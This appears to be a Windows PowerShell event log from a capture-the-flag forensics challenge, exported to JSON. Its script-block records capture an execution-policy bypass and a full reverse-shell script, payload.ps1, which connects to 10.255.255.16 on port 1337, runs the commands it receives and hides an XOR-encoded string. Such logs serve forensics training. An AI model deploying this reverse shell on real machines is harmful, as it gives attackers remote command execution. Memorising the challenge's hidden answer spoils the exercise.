@@ -1,0 +1,462 @@
+Record 1105
+{
+  "Event": {
+    "#attributes": {
+      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
+    },
+    "EventData": null,
+    "System": {
+      "Channel": "Microsoft-Windows-PowerShell/Operational",
+      "Computer": "DESKTOP-AL3DV8F.fcsc.fr",
+      "Correlation": {
+        "#attributes": {
+          "ActivityID": "9B8E9F4F-582A-0001-40CD-8E9B2A58D901"
+        }
+      },
+      "EventID": 40961,
+      "EventRecordID": 1105,
+      "Execution": {
+        "#attributes": {
+          "ProcessID": 5656,
+          "ThreadID": 5668
+        }
+      },
+      "Keywords": "0x0",
+      "Level": 4,
+      "Opcode": 1,
+      "Provider": {
+        "#attributes": {
+          "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
+          "Name": "Microsoft-Windows-PowerShell"
+        }
+      },
+      "Security": {
+        "#attributes": {
+          "UserID": "S-1-5-21-3727796838-1318123174-2233927406-1105"
+        }
+      },
+      "Task": 4,
+      "TimeCreated": {
+        "#attributes": {
+          "SystemTime": "2023-03-16T17:18:04.983626Z"
+        }
+      },
+      "Version": 1
+    }
+  }
+}
+Record 1106
+{
+  "Event": {
+    "#attributes": {
+      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
+    },
+    "EventData": {
+      "param1": "5656",
+      "param2": "DefaultAppDomain"
+    },
+    "System": {
+      "Channel": "Microsoft-Windows-PowerShell/Operational",
+      "Computer": "DESKTOP-AL3DV8F.fcsc.fr",
+      "Correlation": {
+        "#attributes": {
+          "ActivityID": "9B8E9F4F-582A-0001-40CD-8E9B2A58D901"
+        }
+      },
+      "EventID": 53504,
+      "EventRecordID": 1106,
+      "Execution": {
+        "#attributes": {
+          "ProcessID": 5656,
+          "ThreadID": 5852
+        }
+      },
+      "Keywords": "0x0",
+      "Level": 4,
+      "Opcode": 10,
+      "Provider": {
+        "#attributes": {
+          "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
+          "Name": "Microsoft-Windows-PowerShell"
+        }
+      },
+      "Security": {
+        "#attributes": {
+          "UserID": "S-1-5-21-3727796838-1318123174-2233927406-1105"
+        }
+      },
+      "Task": 111,
+      "TimeCreated": {
+        "#attributes": {
+          "SystemTime": "2023-03-16T17:18:05.220938Z"
+        }
+      },
+      "Version": 1
+    }
+  }
+}
+Record 1107
+{
+  "Event": {
+    "#attributes": {
+      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
+    },
+    "EventData": null,
+    "System": {
+      "Channel": "Microsoft-Windows-PowerShell/Operational",
+      "Computer": "DESKTOP-AL3DV8F.fcsc.fr",
+      "Correlation": {
+        "#attributes": {
+          "ActivityID": "9B8E9F4F-582A-0001-40CD-8E9B2A58D901"
+        }
+      },
+      "EventID": 40962,
+      "EventRecordID": 1107,
+      "Execution": {
+        "#attributes": {
+          "ProcessID": 5656,
+          "ThreadID": 5668
+        }
+      },
+      "Keywords": "0x0",
+      "Level": 4,
+      "Opcode": 2,
+      "Provider": {
+        "#attributes": {
+          "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
+          "Name": "Microsoft-Windows-PowerShell"
+        }
+      },
+      "Security": {
+        "#attributes": {
+          "UserID": "S-1-5-21-3727796838-1318123174-2233927406-1105"
+        }
+      },
+      "Task": 4,
+      "TimeCreated": {
+        "#attributes": {
+          "SystemTime": "2023-03-16T17:18:05.679197Z"
+        }
+      },
+      "Version": 1
+    }
+  }
+}
+Record 1108
+{
+  "Event": {
+    "#attributes": {
+      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
+    },
+    "EventData": {
+      "MessageNumber": 1,
+      "MessageTotal": 1,
+      "Path": "",
+      "ScriptBlockId": "dcb325dd-1c30-46bd-8363-81083ac85323",
+      "ScriptBlockText": "if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\\Users\\jmichel\\Downloads\\payload.ps1'"
+    },
+    "System": {
+      "Channel": "Microsoft-Windows-PowerShell/Operational",
+      "Computer": "DESKTOP-AL3DV8F.fcsc.fr",
+      "Correlation": {
+        "#attributes": {
+          "ActivityID": "9B8E9F4F-582A-0001-45CD-8E9B2A58D901"
+        }
+      },
+      "EventID": 4104,
+      "EventRecordID": 1108,
+      "Execution": {
+        "#attributes": {
+          "ProcessID": 5656,
+          "ThreadID": 5756
+        }
+      },
+      "Keywords": "0x0",
+      "Level": 3,
+      "Opcode": 15,
+      "Provider": {
+        "#attributes": {
+          "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
+          "Name": "Microsoft-Windows-PowerShell"
+        }
+      },
+      "Security": {
+        "#attributes": {
+          "UserID": "S-1-5-21-3727796838-1318123174-2233927406-1105"
+        }
+      },
+      "Task": 2,
+      "TimeCreated": {
+        "#attributes": {
+          "SystemTime": "2023-03-16T17:18:06.001286Z"
+        }
+      },
+      "Version": 1
+    }
+  }
+}
+Record 1109
+{
+  "Event": {
+    "#attributes": {
+      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
+    },
+    "EventData": {
+      "MessageNumber": 1,
+      "MessageTotal": 1,
+      "Path": "C:\\Users\\jmichel\\Downloads\\payload.ps1",
+      "ScriptBlockId": "634cf5ca-b06b-4b5a-8354-c5ccd9d3c82a",
+      "ScriptBlockText": "do {\r\n    Start-Sleep -Seconds 1\r\n     try{\r\n        $TCPClient = New-Object Net.Sockets.TCPClient('10.255.255.16', 1337)\r\n    } catch {}\r\n} until ($TCPClient.Connected)\r\n$NetworkStream = $TCPClient.GetStream()\r\n$StreamWriter = New-Object IO.StreamWriter($NetworkStream)\r\nfunction WriteToStream ($String) {\r\n    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}\r\n    $StreamWriter.Write($String + 'SHELL> ')\r\n    $StreamWriter.Flush()\r\n}\r\n$l = 0x46, 0x42, 0x51, 0x40, 0x7F, 0x3C, 0x3E, 0x64, 0x31, 0x31, 0x6E, 0x32, 0x34, 0x68, 0x3B, 0x6E, 0x25, 0x25, 0x24, 0x77, 0x77, 0x73, 0x20, 0x75, 0x29, 0x7C, 0x7B, 0x2D, 0x79, 0x29, 0x29, 0x29, 0x10, 0x13, 0x1B, 0x14, 0x16, 0x40, 0x47, 0x16, 0x4B, 0x4C, 0x13, 0x4A, 0x48, 0x1A, 0x1C, 0x19, 0x2, 0x5, 0x4, 0x7, 0x2, 0x5, 0x2, 0x0, 0xD, 0xA, 0x59, 0xF, 0x5A, 0xA, 0x7, 0x5D, 0x73, 0x20, 0x20, 0x27, 0x77, 0x38, 0x4B, 0x4D\r\n$s = \"\"\r\nfor ($i = 0; $i -lt 72; $i++) {\r\n    $s += [char]([int]$l[$i] -bxor $i)\r\n}\r\nWriteToStream $s\r\nwhile(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {\r\n    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)\r\n    $Output = try {\r\n            Invoke-Expression $Command 2>&1 | Out-String\r\n        } catch {\r\n            $_ | Out-String\r\n        }\r\n    WriteToStream ($Output)\r\n}\r\n$StreamWriter.Close()"
+    },
+    "System": {
+      "Channel": "Microsoft-Windows-PowerShell/Operational",
+      "Computer": "DESKTOP-AL3DV8F.fcsc.fr",
+      "Correlation": {
+        "#attributes": {
+          "ActivityID": "9B8E9F4F-582A-0001-23CE-8E9B2A58D901"
+        }
+      },
+      "EventID": 4104,
+      "EventRecordID": 1109,
+      "Execution": {
+        "#attributes": {
+          "ProcessID": 5656,
+          "ThreadID": 5756
+        }
+      },
+      "Keywords": "0x0",
+      "Level": 5,
+      "Opcode": 15,
+      "Provider": {
+        "#attributes": {
+          "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
+          "Name": "Microsoft-Windows-PowerShell"
+        }
+      },
+      "Security": {
+        "#attributes": {
+          "UserID": "S-1-5-21-3727796838-1318123174-2233927406-1105"
+        }
+      },
+      "Task": 2,
+      "TimeCreated": {
+        "#attributes": {
+          "SystemTime": "2023-03-16T17:18:07.076348Z"
+        }
+      },
+      "Version": 1
+    }
+  }
+}
+Record 1110
+{
+  "Event": {
+    "#attributes": {
+      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
+    },
+    "EventData": {
+      "MessageNumber": 1,
+      "MessageTotal": 1,
+      "Path": "C:\\Users\\jmichel\\Downloads\\payload.ps1",
+      "ScriptBlockId": "a9509b3c-dafb-40c0-a288-943c5c7b0543",
+      "ScriptBlockText": "function WriteToStream ($String) {\r\n    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}\r\n    $StreamWriter.Write($String + 'SHELL> ')\r\n    $StreamWriter.Flush()\r\n}"
+    },
+    "System": {
+      "Channel": "Microsoft-Windows-PowerShell/Operational",
+      "Computer": "DESKTOP-AL3DV8F.fcsc.fr",
+      "Correlation": {
+        "#attributes": {
+          "ActivityID": "9B8E9F4F-582A-0001-2FCF-8E9B2A58D901"
+        }
+      },
+      "EventID": 4104,
+      "EventRecordID": 1110,
+      "Execution": {
+        "#attributes": {
+          "ProcessID": 5656,
+          "ThreadID": 5756
+        }
+      },
+      "Keywords": "0x0",
+      "Level": 5,
+      "Opcode": 15,
+      "Provider": {
+        "#attributes": {
+          "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
+          "Name": "Microsoft-Windows-PowerShell"
+        }
+      },
+      "Security": {
+        "#attributes": {
+          "UserID": "S-1-5-21-3727796838-1318123174-2233927406-1105"
+        }
+      },
+      "Task": 2,
+      "TimeCreated": {
+        "#attributes": {
+          "SystemTime": "2023-03-16T17:18:08.459221Z"
+        }
+      },
+      "Version": 1
+    }
+  }
+}
+Record 1111
+{
+  "Event": {
+    "#attributes": {
+      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
+    },
+    "EventData": {
+      "MessageNumber": 1,
+      "MessageTotal": 1,
+      "Path": "C:\\Users\\jmichel\\Downloads\\payload.ps1",
+      "ScriptBlockId": "a87facd8-740e-4dea-a5c3-61c64a7bb91b",
+      "ScriptBlockText": "{0}"
+    },
+    "System": {
+      "Channel": "Microsoft-Windows-PowerShell/Operational",
+      "Computer": "DESKTOP-AL3DV8F.fcsc.fr",
+      "Correlation": {
+        "#attributes": {
+          "ActivityID": "9B8E9F4F-582A-0000-DECD-8E9B2A58D901"
+        }
+      },
+      "EventID": 4104,
+      "EventRecordID": 1111,
+      "Execution": {
+        "#attributes": {
+          "ProcessID": 5656,
+          "ThreadID": 5756
+        }
+      },
+      "Keywords": "0x0",
+      "Level": 5,
+      "Opcode": 15,
+      "Provider": {
+        "#attributes": {
+          "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
+          "Name": "Microsoft-Windows-PowerShell"
+        }
+      },
+      "Security": {
+        "#attributes": {
+          "UserID": "S-1-5-21-3727796838-1318123174-2233927406-1105"
+        }
+      },
+      "Task": 2,
+      "TimeCreated": {
+        "#attributes": {
+          "SystemTime": "2023-03-16T17:18:08.482336Z"
+        }
+      },
+      "Version": 1
+    }
+  }
+}
+Record 1112
+{
+  "Event": {
+    "#attributes": {
+      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
+    },
+    "EventData": {
+      "MessageNumber": 1,
+      "MessageTotal": 1,
+      "Path": "",
+      "ScriptBlockId": "4428f9cb-0b09-4d3e-bfd2-48500b1b1a14",
+      "ScriptBlockText": "whoami"
+    },
+    "System": {
+      "Channel": "Microsoft-Windows-PowerShell/Operational",
+      "Computer": "DESKTOP-AL3DV8F.fcsc.fr",
+      "Correlation": {
+        "#attributes": {
+          "ActivityID": "9B8E9F4F-582A-0000-17D0-8E9B2A58D901"
+        }
+      },
+      "EventID": 4104,
+      "EventRecordID": 1112,
+      "Execution": {
+        "#attributes": {
+          "ProcessID": 5656,
+          "ThreadID": 5756
+        }
+      },
+      "Keywords": "0x0",
+      "Level": 5,
+      "Opcode": 15,
+      "Provider": {
+        "#attributes": {
+          "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
+          "Name": "Microsoft-Windows-PowerShell"
+        }
+      },
+      "Security": {
+        "#attributes": {
+          "UserID": "S-1-5-21-3727796838-1318123174-2233927406-1105"
+        }
+      },
+      "Task": 2,
+      "TimeCreated": {
+        "#attributes": {
+          "SystemTime": "2023-03-16T17:18:12.762664Z"
+        }
+      },
+      "Version": 1
+    }
+  }
+}
+Record 1113
+{
+  "Event": {
+    "#attributes": {
+      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
+    },
+    "EventData": {
+      "MessageNumber": 1,
+      "MessageTotal": 1,
+      "Path": "",
+      "ScriptBlockId": "0d4b0a1f-2b0b-4b28-a763-a5e90b52da75",
+      "ScriptBlockText": "$global:?"
+    },
+    "System": {
+      "Channel": "Microsoft-Windows-PowerShell/Operational",
+      "Computer": "DESKTOP-AL3DV8F.fcsc.fr",
+      "Correlation": {
+        "#attributes": {
+          "ActivityID": "9B8E9F4F-582A-0000-43D0-8E9B2A58D901"
+        }
+      },
+      "EventID": 4104,
+      "EventRecordID": 1113,
+      "Execution": {
+        "#attributes": {
+          "ProcessID": 5656,
+          "ThreadID": 5756
+        }
+      },
+      "Keywords": "0x0",
+      "Level": 5,
+      "Opcode": 15,
+      "Provider": {
+        "#attributes": {
+          "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
+          "Name": "Microsoft-Windows-PowerShell"
+        }
+      },
+      "Security": {
+        "#attributes": {
+          "UserID": "S-1-5-21-3727796838-1318123174-2233927406-1105"
+        }
+      },
+      "Task": 2,
+      "TimeCreated": {
+        "#attributes": {
+          "SystemTime": "2023-03-16T17:18:17.158236Z"
+        }
+      },
+      "Version": 1
+    }
+  }
+}
